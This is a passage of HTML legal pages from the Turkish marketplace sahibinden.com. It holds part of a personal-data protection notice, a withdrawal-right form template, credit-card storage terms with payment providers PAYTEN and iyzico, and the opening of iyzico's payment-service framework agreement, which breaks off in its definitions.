                <p> Sahibinden, elde ettiği kişisel verileri, Kullanıcılar’a Hizmet’ten en iyi şekilde faydalanabilmeleri için işbu Bilgilendirme ile Üyelik Sözleşmesi’nde belirtilen şartlar çerçevesinde ve Üyelik Sözleşmesi’nin mahiyetinden kaynaklanan yükümlülükleri yerine getirebilmesi adına işlendikleri amaç için gerekli olan süre kadar muhafaza edecektir.</p>
                <p> Buna ek olarak, Sahibinden, Üyelik Sözleşmesi’nden doğabilecek herhangi bir uyuşmazlık durumunda, uyuşmazlık kapsamında idari veya yargı süreçlerinin yürütülebilmesi amacıyla sınırlı olmak üzere ve ilgili mevzuat uyarınca belirlenen zamanaşımı süreleri boyunca kişisel verileri saklayacaktır.</p>
                <p>
                  <strong>ç) İşlenen Kişisel Verilerin Kimlere ve Hangi Amaçla Aktarılabileceği</strong>
                </p>
                <p> Sahibinden, Kullanıcıya ait kişisel verileri ve bu kişisel verileri kullanılarak elde ettiği yeni verileri veya Kullanıcıların kendilerinin pozitif hareketleriyle Portal’a girdikleri kişisel bilgileri başta Üyelik Sözleşmesi gereklerini ve Hizmetler’i ifa etmek, Kullanıcı deneyimini geliştirmek (iyileştirme ve kişiselleştirme dahil), Kullanıcıların güvenliğini sağlamak, dolandırıcılığı tespit etmek ve önlemek, Hizmet’leri geliştirmek, Hizmet’ler için önem arz edebilecek nitelikteki sorgulama faaliyetlerini gerçekleştirmek, operasyonel değerlendirme araştırması yapmak, hataları gidermek, Kullanıcı kimliklerini doğrulamak, sistem performansını geliştirmek, çevrimiçi eğitim faaliyetlerinin sağlanması olmak üzere yukarıda işleme amaçları kısmında belirtilen amaçlardan herhangi birini gerçekleştirebilmek için dış kaynak hizmet sağlayıcılar, iş ortakları, tedarikçiler, ekspertiz ve gayrimenkul danışmanlığı firmaları; Hizmetler’i ifa ederken aktarımın gerektirdiği ölçüde kurumsal üyeler, &nbsp;kargo şirketleri, hukuk büroları, araştırma şirketleri, çağrı merkezleri,&nbsp;Sahibinden Akademi ve benzeri çevrimiçi eğitim platformları, şikayet yönetimi ve güvenliğin sağlanmasına ilişkin yazılım şirketleri, ajanslar, danışmanlık şirketleri, basım sektöründe yer alan şirketler, bankaların emlak satışları için bankalar, emlak projeleri ile ilgili olarak müteahhitlik firmaları, sosyal medya mecraları, belgelendirme kuruluşları dahil üçüncü gerçek ve/veya tüzel kişiler ile ve yasal zorunluluklar kapsamında yetkili kurum, kuruluş, merci, idari, yargı organları ve bağımsız denetim şirketleri ile paylaşmaktadır.</p>
                <p> Ayrıca, Kullanıcının Ad ve İletişim Bilgileri, ödeme aşamasında onaylayacağı ödeme kuruluşu çerçeve sözleşmesi uyarınca ve&nbsp;9 Ocak 2008 tarihli ve 26751 sayılı Resmi Gazete’de yayımlanan Suç Gelirlerinin Aklanmasının ve Terörün Finansmanının Önlenmesine Dair Tedbirler Hakkında Yönetmelik uyarınca kimlik doğrulaması gerçekleştirilmesi amacıyla&nbsp;ödeme kuruluşlarıyla paylaşılacaktır.</p>
                <p> Cihazınıza yerleştirilen çerezler aracılığıyla elde edilen kişisel verileriniz üçüncü kişiler ile işbu Bilgilendirme’de belirtilen kapsam ve amaçlarla paylaşılabilecektir.</p>
                <p> Sahibinden kişisel verileri yukarıda belirtilen kategoriler ve amaçlar dahilinde bu amaçlarla sınırlı ve orantılı olmak üzere yurt içinde üçüncü kişilere aktarabileceği gibi yurt dışına da aktarabilecektir.</p>
                <p>
                  <strong>d) Kişisel Veri Toplamanın Yöntemi ve Hukuki Sebebi</strong>
                </p>
                <p> Sahibinden, daha etkin bir şekilde çalışmak ve size en iyi deneyimi sunmak için kişisel verilerinizi toplamaktadır. Sahibinden, kişisel verilerinizi, doğrudan sizden (veri sahibi), sizin adınıza hareket eden vekil ve/veya hareket etmeye yetkili kişiler tarafından verileriniz aşağıdaki yöntemler kullanılarak toplanmaktadır:</p>
                <p>
                  <strong>Doğrudan Sahibinden’e Vermiş Olduğunuz Veriler:&nbsp;</strong>Hizmet’in ifası için ve Portal’ın kullanımı öncesinde veya sırasında, Sahibinden’e Kullanıcıların kendi inisiyatifleri doğrultusunda verdikleri kişisel verileri ifade eder. Bu kişisel veriler, doğrudan Kullanıcılar tarafından Sahibinden’e pozitif hareketleri neticesinde verilen tüm kişisel verileri kapsar. Örneğin, ad-soyad, iletişim bilgileri, kimlik bilgileri, anketlere verilen cevaplar, demografik veriler ve içerik bilgileri bu tür verilere girmektedir.
                </p>
                <p>
                  <strong>Platformumuzu Kullandığınız Zaman Elde Ettiğimiz Veriler:&nbsp;</strong>Sahibinden’in sunduğu hizmet sırasında, belirli yazılım ya da teknolojik araçlar vasıtasıyla alınan Kullanıcıların kullanım alışkanlıklarına ilişkin kişisel verileri kapsamaktadır. Örneğin, konum verileri ve sık kullanılanlar ile birlikte ilgi alanları ve kullanım verileri bu tür verilere girmektedir.
                </p>
                <p> Sahibinden, çevrimiçi davranışsal reklamcılık ve pazarlama yapılabilmesi amacıyla siteye gelen kullanıcının üye olmasalar dahi sitedeki davranışlarını tarayıcıda bulunan bir cookie (çerez) ile ilişkilendirme ve görüntülenen sayfa sayısı, ziyaret süresi ve hedef tamamlama sayısı gibi kullanım verilerini toplamaktadır. Çerezlerin nasıl yönetileceği ayrıca Çerez Politikamızda belirtilmiştir.</p>
                <p> Bu yöntemlerle toplanan kişisel verileriniz 6698 sayılı Kanun’un 5. ve 6. maddelerinde belirtilmiş olan;</p>
                <ul>
                  <li> Kanunlarda açıkça öngörülmüş olması,</li>
                  <li> Hukuki yükümlülüğünü yerine getirebilmek için zorunlu olması (Elektronik ticaret faaliyetlerini, maliyeye ve vergiye ait hususları, tüketicinin korunmasını ve sair konuları düzenleyen yasal düzenlemeler),</li>
                  <li> Sözleşmenin kurulması veya ifasıyla doğrudan doğruya ilgili olup işlemenin gerekli olması (Üyelik Sözleşmesi, Kullanım Koşulları ve bunlara dayalı olarak sözleşmenin ifası, hakkın tesisi ve korunması),</li>
                  <li> Meşru menfaati için işlemenin zorunlu olması (Sahibinden’in Portal ile ilgili faaliyetlerinde özellikle dolandırıcılığı engellemek başta olmak üzere hizmetleri yürütebilmesi için gerekli olan verileri toplaması),</li>
                  <li> Tarafınızca alenileştirilmiş olması,</li>
                  <li> Bir hakkın tesisi, kullanılması veya korunması için işlemenin zorunlu olması,</li>
                  <li> Açık rızanızın bulunması</li>
                </ul>
                <p> şeklindeki hukuki sebeplere dayanmaktadır.</p>
                <p> Bu yöntemlerle toplanan kişisel verileriniz 6698 sayılı Kanun’un 5. ve 6. maddelerinde belirtilen kişisel veri işleme şartları ve amaçları kapsamında bu Bilgilendirme’de belirtilen amaçlarla işlenebilmekte ve aktarılabilmektedir.</p>
                <p> Kişisel verileri toplamanın hukuki dayanakları;</p>
                <ul>
                  <li> Üyelik Sözleşmesi, Kullanım Koşulları ve bunlara dayalı olarak sözleşmenin ifası, hakkın tesisi ve korunması</li>
                  <li> Elektronik ticaret faaliyetlerini, maliyeye ve vergiye ait hususları, tüketicinin korunmasını ve sair konuları düzenleyen yasal düzenlemeler</li>
                  <li> Sahibinden’in Portal ile ilgili faaliyetlerinde özellikle dolandırıcılığı engellemek başta olmak üzere hizmetleri yürütebilmesi için gerekli olan verileri toplamasındaki meşru menfaatine dayanmaktadır.</li>
                </ul>
                <p>
                  <strong>e) Veri Güvenliğine İlişkin Önlemlerimiz ve Taahhütlerimiz</strong>
                </p>
                <p> Sahibinden, kişisel verileri güvenli bir şekilde korumayı taahhüt eder. Kişisel verilerin hukuka aykırı olarak işlenmesini ve erişilmesini engellemek ve kişisel verilerin muhafazasını sağlamak amacıyla uygun güvenlik düzeyini temin etmeye yönelik teknik ve idari tedbirleri çeşitli yöntemler ve güvenlik teknolojileri kullanarak gerçekleştirmektedir.</p>
                <p> Sahibinden, elde ettiği kişisel verileri bu işbu Bilgilendirme ve 6698 Sayılı Kişisel Verilerin Korunması Kanunu hükümlerine aykırı olarak başkasına açıklamayacaktır ve işleme amacı dışında kullanmayacaktır. Sahibinden, işbu Bilgilendirme uyarınca dış kaynak hizmet sağlayıcılarla Kullanıcılar’a ait kişisel verilerin paylaşılması durumunda, söz konusu dış kaynak tedarikçilerinin de işbu madde altında yer alan taahhütlere riayet etmeleri için gerekli uyarı ve denetim faaliyetlerini icra edeceğini beyan eder.</p>
                <p> Portal üzerinden başka uygulamalara link verilmesi halinde Sahibinden, link verilen uygulamaların gizlilik politikaları ve içeriklerine yönelik herhangi bir sorumluluk taşımamaktadır.</p>
                <p> Kullanıcı, işbu Bilgilendirmeye konu bilgilerinin tam, doğru ve güncel olduğunu, bu bilgilerde herhangi bir değişiklik olması halinde bunları derhal&nbsp; <a href="https://banaozel.sahibinden.com/">https://banaozel.sahibinden.com/</a>&nbsp;adresinden güncelleyeceğini taahhüt eder. Kullanıcı’nın güncel bilgileri sağlamamış olması halinde Sahibinden’in herhangi bir sorumluluğu olmayacaktır. </p>
                <p>
                  <strong>f) Kişisel Veri Sahibi’nin 6698 sayılı Kanun’un 11. maddesinde Sayılan Hakları</strong>
                </p>
                <p> Kişisel veri sahipleri olarak, haklarınıza ilişkin taleplerinizi aşağıda düzenlenen yöntemlerle Sahibinden’e iletmeniz durumunda Sahibinden talebin niteliğine göre talebi en kısa sürede ve en geç otuz gün içinde sonuçlandıracaktır. Verilecek cevapta on sayfaya kadar ücret alınmayacaktır. On sayfanın üzerindeki her sayfa için 1 Türk Lirası işlem ücreti alınacaktır. Başvuruya cevabın CD,&nbsp;flash&nbsp;bellek gibi bir kayıt ortamında verilmesi halinde Sahibinden tarafından talep edilebilecek ücret kayıt ortamının maliyetini geçmeyecektir.</p>
                <p> Bu kapsamda kişisel veri sahipleri;</p>
                <ul>
                  <li> Kişisel verilerinin işlenip işlenmediğini öğrenme,</li>
                  <li> Kişisel verileri işlenmişse buna ilişkin bilgi talep etme,</li>
                  <li> Kişisel verilerin işlenme amacını ve bunların amacına uygun kullanılıp kullanılmadığını öğrenme,</li>
                  <li> Yurt içinde veya yurt dışında kişisel verilerin aktarıldığı üçüncü kişileri bilme,</li>
                  <li> Kişisel verilerin eksik veya yanlış işlenmiş olması hâlinde bunların düzeltilmesini isteme ve bu kapsamda yapılan işlemin kişisel verilerin aktarıldığı üçüncü kişilere bildirilmesini isteme,</li>
                  <li> 6698 sayılı Kanun ve ilgili diğer kanun hükümlerine uygun olarak işlenmiş olmasına rağmen, işlenmesini gerektiren sebeplerin ortadan kalkması halinde kişisel verilerin silinmesini veya yok edilmesini isteme ve bu kapsamda yapılan işlemin kişisel verilerin aktarıldığı üçüncü kişilere bildirilmesini isteme,</li>
                  <li> İşlenen verilerin münhasıran otomatik sistemler vasıtasıyla analiz edilmesi suretiyle kişinin kendisi aleyhine bir sonucun ortaya çıkmasına itiraz etme,</li>
                  <li> Kişisel verilerin kanuna aykırı olarak işlenmesi sebebiyle zarara uğraması halinde zararın giderilmesini talep etme haklarına sahiptir.</li>
                </ul>
                <p> Yukarıda belirtilen haklarınızı kullanmak ile ilgili talebinizi, Veri Sorumlusuna Başvuru Usul ve Esasları Hakkında Tebliğ'in 5. maddesi uyarınca, Türkçe olarak; veri sorumlusu sıfatıyla Sahibinden'in Değirmen Yolu Cad. No:28 Asia OfisPark A Blok Kat:2 34752 Ataşehir/İstanbul/Türkiye adresine kimliğinizi tevsik edici bilgi ve belgeler ile yazılı olarak, <a href="mailto:sahibinden@hs02.kep.tr">sahibinden@hs02.kep.tr</a>&nbsp;adresine kayıtlı elektronik posta (KEP) ile, <a href="mailto:kvk@sahibinden.com">kvk@sahibinden.com</a> adresine güvenli elektronik imza, mobil imza ile veya ilgili kişi tarafından Sahibinden sisteminde kayıtlı bulunan elektronik posta adresini kullanmak suretiyle iletebilirsiniz. </p>
                <p> Sahibinden'in kişisel verilerinizin hukuka aykırı paylaşımının önlenmesi amacıyla kimliğinizi doğrulama hakkı saklıdır.</p>
                <p> Başvurunuzda;</p>
                <ol>
                  <li> Adınızın,&nbsp;soyadınızın&nbsp;ve başvuru yazılı ise imzanızın,</li>
                  <li> Türkiye Cumhuriyeti vatandaşları için T.C. kimlik numaranızın, yabancı iseniz uyruğunuzun, pasaport numaranızın veya varsa kimlik numaranızın,</li>
                  <li> Tebligata esas yerleşim yeri veya iş yeri adresinizin,</li>
                  <li> Varsa bildirime esas elektronik posta adresi, telefon ve faks numaranızın,</li>
                  <li> Talep konunuzun,</li>
                </ol>
                <p> bulunması&nbsp;zorunlu olup varsa konuya ilişkin bilgi ve belgelerin de başvuruya eklenmesi gerekmektedir.</p>
              </span>
            </div>
            <div id="recantationFormExample" class="recantationFormExample">
              <div class="agreement">
                <h4>Cayma Hakkı Formu Örneği</h4>
                <p style="margin:15px 0 15px 0">
                  <strong>Kime:</strong> (SATICI’nın ismi, unvanı, adresi varsa faks numarası ve e-posta adresi yer alacaktır.)
                </p>
                <p style="margin:0 0 15px 0"> Bu form ile aşağıdaki malların satışına veya hizmetlerin sunulmasına ilişkin sözleşmeden cayma hakkımı kullandığımı beyan ederim. </p>
                <p style="margin:0 0 15px 0">
                  <strong>Sipariş tarihi veya teslim tarihi:</strong>
                </p>
                <p style="margin:0 0 15px 0">
                  <strong>Cayma hakkına konu mal veya hizmet:</strong>
                </p>
                <p style="margin:0 0 15px 0">
                  <strong>Cayma hakkına konu mal veya hizmetin bedeli:</strong>
                </p>
                <p style="margin:0 0 15px 0">
                  <strong>ALICI’nın adı ve soyadı:</strong>
                </p>
                <p style="margin:0 0 15px 0">
                  <strong>ALICI’nın adresi:</strong>
                </p>
                <p style="margin:0 0 15px 0">
                  <strong>ALICI’nın imzası: </strong>(Sadece kağıt üzerinde gönderilmesi halinde)
                </p>
                <p style="margin:0 0 15px 0">
                  <strong> Tarih:</strong>
                </p>
              </div>
            </div>
            <div id="creditcardSavingAgreement" class="creditcardSavingAgreement">
              <h1>Kredi Kartı Saklama Koşulları</h1>
              <p>sahibinden.com tarafından sunulan hizmetler ile sahibinden.com tarafından satın alınmasına aracılık edilen ürün ve hizmetlerin alımında; kredi kartı bilgilerinin kaydedilmesine ve kaydedilmiş kredi kartı bilgilerinin kullanılmasına ilişkin bilgiler ile ilgili beyanım aşağıda yer almaktadır: </p>
              <br>
              <p> İşbu Kullanıcı Beyanı ile; PAYTEN TEKNOLOJİ A.Ş. (“PAYTEN”)(eski unvanı ASSECO SEE TEKNOLOJİ A.Ş. kısaca “ASSECO”)’ye sunduğum kredi kartı bilgilerinin PAYTEN tarafından kaydedilmesine, saklanmasına, SAHİBİNDEN BİLGİ TEKNOLOJİLERİ PAZARLAMA ve TİCARET A.Ş. (“SAHİBİNDEN”) tarafından verilecek tahsilat talimatlarına uygun olarak PAYTEN aracılığıyla SAHİBİNDEN adına ödemenin gerçekleştirilmesi amacıyla kredi kartı bilgilerimin kullanılmasına ve tahsilata ilişkin işlem sonuçlarının SAHİBİNDEN’e iletilmesine muvafakat ettiğimi kabul, beyan ve taahhüt ederim. </p>
              <br>
              <p>
                <strong>
                  <u>sahibinden.com tarafından satın alınmasına aracılık edilen ürün ve hizmetlere ilişkin bilgi:</u>
                </strong>
                <br>sahibinden.com tarafından satın alınmasına aracılık edilen ürün ve hizmetlere ilişkin Kullanıcıların kredi kartı bilgileri sadece PAYTEN’de saklanmakta olup, kredi kartından tahsilat işlemleri SAHİBİNDEN’in talimatı ile İYZİ ÖDEME VE ELEKTRONİK PARA HİZMETLERİ A.Ş. (“İYZİCO”) tarafından gerçekleştirilmekte, kredi kartı bilgileri İYZİCO ve SAHİBİNDEN tarafından saklanmamaktadır.
              </p>
              <br>
              <p> İşbu Kullanıcı Beyanı ile; PAYTEN’e sunduğum kredi kartı bilgilerinin PAYTEN tarafından kaydedilmesine, saklanmasına, sahibinden.com tarafından satın alınmasına aracılık edilen ürün ve hizmetlerde; SAHİBİNDEN tarafından verilecek tahsilat talimatlarına uygun olarak İYZİCO tarafından SAHİBİNDEN adına gerçekleştirilen ödeme işlemleri için kredi kartı bilgilerimin PAYTEN tarafından İYZİCO’ya iletilmesine, tahsilata ilişkin işlem sonuçlarının SAHİBİNDEN’e gönderilmesine muvafakat ettiğimi kabul, beyan ve taahhüt ederim.</p>
              <br>
              <p> İYZİCO tarafından SAHİBİNDEN’e verilen ödeme hizmetinin herhangi bir sebeple sona ermesi halinde; kredi kartı bilgilerimin PAYTEN tarafından SAHİBİNDEN’in ödeme hizmeti alacağı ödeme kuruluşuna gönderilmesine muvafakat ettiğimi kabul, beyan ve taahhüt ederim. </p>
              <br>
              <p>
                <strong>
                  <u>sahibinden.com tarafından sunulan hizmetlerin alımına ilişkin bilgi:</u>
                </strong>
                <br>sahibinden.com tarafından sunulan herhangi bir hizmeti satın almak isteyen Kullanıcıların da kredi kartı bilgileri PAYTEN tarafından saklandığı gibi, ödeme işlemlerinin gerçekleştirilebilmesi için kart bilgilerinin kullanılması ve işlenmesi de sadece PAYTEN tarafından gerçekleştirilmektedir.
              </p>
              <br>
              <p> Kredi kartı bilgileri kullanımının her bir işlemde benim talebim ve onayım üzerine gerçekleşmekte olduğunu ve bu kapsamda SAHİBİNDEN’in kart bilgilerimin saklanmasına ilişkin herhangi bir sorumluluğu bulunmadığını, kart bilgilerimin saklanması ile ilgili SAHİBİNDEN’e karşı yasal yollara başvurma hakkımdan gayri kabili rücu olarak feragat ettiğimi ayrıca kabul, beyan ve taahhüt ederim. </p>
              <br>
              <p> PAYTEN tarafından SAHİBİNDEN’e verilen hizmetin herhangi bir sebeple sona ermesi halinde; kredi kartı bilgilerimin SAHİBİNDEN’e veya SAHİBİNDEN tarafından bildirilen firmaya PAYTEN tarafından devredilmesine gayri kabili rücu olarak muvafakat ettiğimi, bu konuda PAYTEN’i yetkilendirdiğimi ve talepte bulunduğumu, devir tarihi itibariyle kredi kartı bilgilerimin kaydedilmesi, saklanması, ödemelerde kullanılmasına ilişkin sorumluluğun devredilen firmaya ait olacağını kabul, beyan ve taahhüt ederim. </p>
              <br>
              <p> Kredi kartı bilgilerimin ve kredi kartı işlem sonucu bilgilerimin alınmasının, PAYTEN’e ve İYZİCO’ya veya ileride olabilecek diğer bir ödeme kuruluşuna aktarılmasının ve işlenmesinin kredi kartı ile ödeme yapılan yukarıda sayılan sahibinden.com tarafından sunulan hizmetler ile sahibinden.com tarafından satın alınmasına aracılık edilen ürün ve hizmetler işlemlerinin yapılabilmesi için gerekli olduğunu, bu bakımdan bu işlemlerin yapılabilmesi için bu verilerin tarafımca verilmesinin ifa şartı teşkil ettiğini, SAHİBİNDEN’in ve PAYTEN ile İYZİCO’nun veya ileride olabilecek diğer bir ödeme kuruluşunun bu bilgileri Üyelik Sözleşmesi, Kullanım Koşulları, Gizlilik Politikası kapsamında kullandığını bildiğimi, kişisel verilerim ile ilgili olarak&nbsp; <a href="https://www.sahibinden.com/sozlesmeler/kisisel-verilerin-korunmasi-ve-islenmesi-hakkinda-bilgilendirme-58">Kişisel Verilerin Korunması</a>&nbsp;sayfasındaki Kişisel Verilerin Korunması Hakkında Bilgilendirme metnini okuduğumu ve haklarımı bildiğimi; kendi kredi kartı bilgilerim dışında üçüncü kişilerin kredi kartı bilgilerini vermem veya SAHİBİNDEN portali üzerinden bu verileri kullanmam durumunda bu verilerin korunmasından, işlenmesinden, aktarılmasından ve KVKK kapsamındaki tüm yükümlülüklerden ve hukuka aykırı kullanımdan dolayı tüm cezai ve hukuki sorumluluğun tarafıma ait olduğunu, SAHİBİNDEN’in ve ödeme kuruluşlarının kendi sistemlerinde yukarıda sayılan işlemlerin gerçekleştirilmesi için zorunlu olarak topladığı kişisel veriler dışındaki hiçbir kişisel veri için KVKK kapsamında herhangi bir yükümlülüklerinin ve sorumluluklarının olmadığını kabul, beyan ve taahhüt ederim. </p>
              <br>
              <p> Kişisel verilerin korunması yükümlülüğüne aykırı hareket etmem veya kişisel verilerin işlenmesi, aktarılması veya sair surette bir işleme tarafımca konu edilmesi ve bu kullanımın bir ihlal meydana getirmesi durumunda, Kişisel Verileri Koruma Kurulu’nun veya idari makamların veya mahkemelerin kişisel verilerle ilgili olarak verdikleri kararlar neticesinde “SAHİBİNDEN”in bir zarara uğraması durumunda bu zararı ilk talepte nakden ve defaten tazmin edeceğimi kabul, beyan ve taahhüt ederim. </p>
            </div>
            <div id="marketPlaceProviderAgreement" class="marketPlaceProviderAgreement">
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#333333">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">27 Haziran 2015 tarihinde yürürlüğe giren Ödeme Hizmetleri Yönetmeliği’ne göre; ödeme işlemleri yönetiminin Bankacılık Düzenleme ve Denetleme Kurumu (BDDK) tarafından yetkilendirilmiş bir ödeme kuruluşu tarafından yapılması zorunludur. Ödenen ürün bedeli, yetkilendirilmiş bir ödeme kuruluşu tarafından güvence altına alınmış olmaktadır.</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#333333">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Bu amaçla, Sahibinden.com üzerinden ürün veya hizmet satın alabilmeniz için, ödeme işlemini gerçekleştirecek olan iyzico Ödeme ve Elektronik Para Hizmetleri A.Ş.'ye (“iyzico”) ait aşağıdaki Ödeme Hizmeti Çerçeve Sözleşmesi’ni onaylamanız, ödeme işlemlerinizin iyzico üzerinden yapılacağını kabul etmeniz gerekmektedir.</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p align="center" style="margin-bottom: 0.21cm; line-height: 100%">
                <br> &nbsp;
              </p>
              <p align="center" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">iYZICO ÖDEME HİZMETİ ÇERÇEVE SÖZLEŞMESİ</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">1. TARAFLAR</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">İşbu “</font>
                  </font>
                </font>
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">iyzico Ödeme Hizmeti Çerçeve Sözleşmesi” (“Sözleşme”)</font>
                  </font>
                </font>
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">, aşağıda bilgileri yer alan “iyzico” ile işbu Sözleşme’deki hizmetlerden faydalanmak isteyen Kullanıcı arasında akdedilmiştir.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">Unvan</font>
                  </font>
                </font>
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">: iyzi Ödeme ve Elektronik Para Hizmetleri A.Ş. (“iyzico”)</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">Adres</font>
                  </font>
                </font>
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">: Burhaniye Mah. Atilla Sok. No:7 Üsküdar İstanbul</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">Vergi Daire ve No</font>
                  </font>
                </font>
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">: Üsküdar Vergi Dairesi 483 034 3157</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">iyzico ve Kullanıcı bundan böyle birlikte “Taraflar”, ayrı ayrı “Taraf” olarak anılacaktır.</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">2. TANIMLAR</font>
                  </font>
                </font>
              </p>
              <p align="justify" style="margin-bottom: 0.21cm; line-height: 100%">
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">İnternet Sitesi</font>
                  </font>
                </font>
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt">: Satıcı tarafından satışa sunulan ürün ve hizmetleri teşhir etmek için, Alıcı tarafından ise ürün veya hizmetlerin satın alınması için kullanılan </font>
                  </font>
                </font>
                <font color="#0000ff">
                  <u>
                    <a href="http://www.sahibinden.com/">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">www.sahibinden.com</font>
                      </font>
                    </a>
                  </u>
                </font>
                <font color="#000000">
                  <font face="Arial, serif">
                    <font size="2" style="font-size: 10pt"> alan adlı internet sitesi ve/veya mobil uygulamalar</font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Servis: İşbu Sözleşme’de belirlenen hüküm ve koşullar çerçevesinde iyzico tarafından Alıcı ve Satıcı’ya sunulacak olan hizmet</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Alıcı</font>
                      </font>
                    </font>
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">: İnternet Sitesi üzerinden işbu Sözleşme kapsamında sunulan servisler aracılığı ile ürün veya hizmet alımı yapan ve bu amaçla Servis’ten faydalanan gerçek veya tüzel kişi,</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Satıcı: Ödeme İşlemi’ne konu fonun ulaşması istenilen, İnternet Sitesi üzerinden satış gerçekleştiren gerçek veya tüzel kişi</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Kullanıcı: İşbu Sözleşme’deki hizmetlerden Alıcı veya Satıcı sıfatıyla faydalanan gerçek veya tüzel kişi (Alıcı ve Satıcı birlikte “Kullanıcı” olarak anılacaktır)</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Sözleşme</font>
                      </font>
                    </font>
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">: Kullanıcı ile akdedilen işbu Ödeme Hizmeti Çerçeve Sözleşmesi</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">Pazaryeri veya </font>
                      </font>
                    </font>
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">SAHİBİNDEN: İnternet Sitesi’ni işletmekte olan Sahibinden Bilgi Teknolojileri Pazarlama ve Ticaret A.Ş.</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff">
                <font face="Times New Roman, serif">
                  <font size="3" style="font-size: 12pt">
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">iyzico</font>
                      </font>
                    </font>
                    <font color="#000000">
                      <font face="Arial, serif">
                        <font size="2" style="font-size: 10pt">: İletişim bilgileri işbu Sözleşme’nin 1. maddesinde belirtilen ve işbu Sözleşme’de ödeme hizmeti sağlayıcı taraf olan iyzi Ödeme ve Elektronik Para Hizmetleri A.Ş.</font>
                      </font>
                    </font>
                  </font>
                </font>
              </p>
              <p style="margin-bottom: 0cm; line-height: 100%; background: #ffffff"> &nbsp;</p>
